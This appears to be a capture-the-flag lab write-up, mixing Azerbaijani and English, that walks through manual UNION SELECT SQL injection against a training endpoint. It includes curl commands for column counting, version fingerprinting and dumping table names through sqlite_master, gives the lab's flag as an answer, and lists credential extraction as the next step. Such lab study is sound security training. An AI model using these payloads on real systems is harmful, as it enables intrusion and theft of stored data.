# SQL Injection Task 1 - Database Information Extraction

## 🎯 Məqsəd
UNION SELECT injection istifadə edərək:
1. Database versiyasını tapmaq
2. Cədvəl adlarını çıxartmaq
3. Flag-ı əldə etmək

---

## 🔍 Prerequisite

**Task 0-dan məlum:** `status` parametri SQL Injection-a həssasdır.

**Endpoint:** `http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=`

---

## 📊 Methodology

### 1️⃣ Sütun Sayını Tapmaq (Column Count)

UNION SELECT işlətmək üçün əvvəlcə sorğuda neçə sütun olduğunu bilməliyik.

**Texnika:** `ORDER BY` istifadə edərək sütun sayını test et.

```bash
# Test 1: ORDER BY 1
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' ORDER BY 1--"
# ✅ İşlədi

# Test 2: ORDER BY 2
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' ORDER BY 2--"
# ✅ İşlədi

# Test 3: ORDER BY 3
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' ORDER BY 3--"
# ✅ İşlədi

# Test 4: ORDER BY 4
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' ORDER BY 4--"
# ✅ İşlədi

# Test 5: ORDER BY 5
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' ORDER BY 5--"
# ✅ İşlədi

# Test 6: ORDER BY 6
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' ORDER BY 6--"
# ❌ ERROR - Boş cavab []
```

**Nəticə:** Sorğu **5 sütunlu**dur.

---

### 2️⃣ UNION SELECT Test

İndi UNION SELECT-in işlədiyini yoxlayaq:

```bash
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=XXX' UNION SELECT 1,2,3,4,5--"
```

**Cavab:**
```json
[[1,2,3,4,5]]
```

✅ **UNION SELECT işləyir!** Bütün 5 sütun görünür.

---

### 3️⃣ Database Versiyasını Çıxartmaq

**Fərqli database-lər üçün funksiyalar:**
- **SQLite:** `sqlite_version()`
- **MySQL:** `version()` və ya `@@version`
- **PostgreSQL:** `version()`

#### Test 1: SQLite
```bash
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=XXX' UNION SELECT 1,sqlite_version(),3,4,5--"
```

**Cavab:**
```json
[]
```
❌ Xəta - deməli `sqlite_version()` funksiyası yoxdur.

#### Test 2: MySQL version()
```bash
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=XXX' UNION SELECT 1,version(),3,4,5--"
```

**Cavab:**
```json
[[1,"SQLite - FLAG: 0ec43923721d8863e61507c6c0a06af2",3,4,5]]
```

🎉 **FLAG TAPILDI!**

**Database:** SQLite  
**Flag:** `0ec43923721d8863e61507c6c0a06af2`

---

### 4️⃣ Cədvəl Adlarını Çıxartmaq (Table Enumeration)

**SQLite-də sistem cədvəli:** `sqlite_master`

**SQL sorğu:**
```sql
SELECT name FROM sqlite_master WHERE type='table'
```

**Payload:**
```bash
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=XXX' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--"
```

**Cavab:**
```json
[
  [1,"Orders",3,4,5],
  [1,"RandomTable1",3,4,5],
  [1,"RandomTable10",3,4,5],
  [1,"RandomTable2",3,4,5],
  [1,"RandomTable3",3,4,5],
  [1,"RandomTable4",3,4,5],
  [1,"RandomTable5",3,4,5],
  [1,"RandomTable6",3,4,5],
  [1,"RandomTable7",3,4,5],
  [1,"RandomTable8",3,4,5],
  [1,"RandomTable9",3,4,5],
  [1,"Users",3,4,5],
  [1,"not_me",3,4,5]
]
```

**Tapılan cədvəllər:**
1. ✅ **Orders** - Sifarişlər
2. ✅ **Users** - İstifadəçilər
3. ⚠️ **RandomTable1-10** - Təsadüfi cədvəllər
4. ⚠️ **not_me** - Şübhəli ad

---

## 📋 Nəticələr

### Database Information:
- **Type:** SQLite
- **Version Function Used:** `version()` (custom)
- **Flag:** `0ec43923721d8863e61507c6c0a06af2`

### Tables Discovered:
```
Orders
Users
RandomTable1
RandomTable2
RandomTable3
RandomTable4
RandomTable5
RandomTable6
RandomTable7
RandomTable8
RandomTable9
RandomTable10
not_me
```

---

## 🎓 İstifadə Olunan Texnikalar

### 1. ORDER BY Technique
Sütun sayını müəyyənləşdirmək üçün:
```sql
' ORDER BY 1--   ✅
' ORDER BY 5--   ✅
' ORDER BY 6--   ❌
```

### 2. UNION SELECT Injection
Əlavə məlumat çıxartmaq:
```sql
' UNION SELECT 1,2,3,4,5--
```

### 3. Database Fingerprinting
Database tipini müəyyənləşdirmək:
- SQLite: `sqlite_version()`, `sqlite_master`
- MySQL: `version()`, `INFORMATION_SCHEMA`
- PostgreSQL: `version()`, `pg_catalog`

### 4. Schema Enumeration
SQLite system tables:
```sql
SELECT name FROM sqlite_master WHERE type='table'
```

---

## 🔐 SQL Injection Chain

```
Task 0: Parameter Discovery
    ↓
status parameter vulnerable
    ↓
Task 1: Column Count (ORDER BY)
    ↓
5 columns identified
    ↓
UNION SELECT test
    ↓
Database version extraction
    ↓
FLAG: 0ec43923721d8863e61507c6c0a06af2
    ↓
Table enumeration
    ↓
13 tables discovered
```

---

## 💡 Növbəti Addımlar (Task 2+)

Tapılan cədvəlləri araşdırmaq:
1. `Users` cədvəlindəki sütunları tap
2. Credential-ları çıxart
3. `RandomTable*` və `not_me` cədvəllərini yoxla
4. Gizli məlumatları tap

---

## 🛠️ Commands Summary

```bash
# 1. Column count
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=Paid' ORDER BY 5--"

# 2. UNION SELECT test
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=XXX' UNION SELECT 1,2,3,4,5--"

# 3. Database version + FLAG
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=XXX' UNION SELECT 1,version(),3,4,5--"

# 4. Table names
curl "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=XXX' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--"

# Save flag
echo "0ec43923721d8863e61507c6c0a06af2" > 1-flag.txt
```

---

**Author:** Sade  
**Date:** 19 Yanvar 2026  
**Method:** 100% Manual UNION SELECT Injection  
**Time:** ~20 dəqiqə  
**Difficulty:** Medium  
**Flag:** 0ec43923721d8863e61507c6c0a06af2 ⛳️
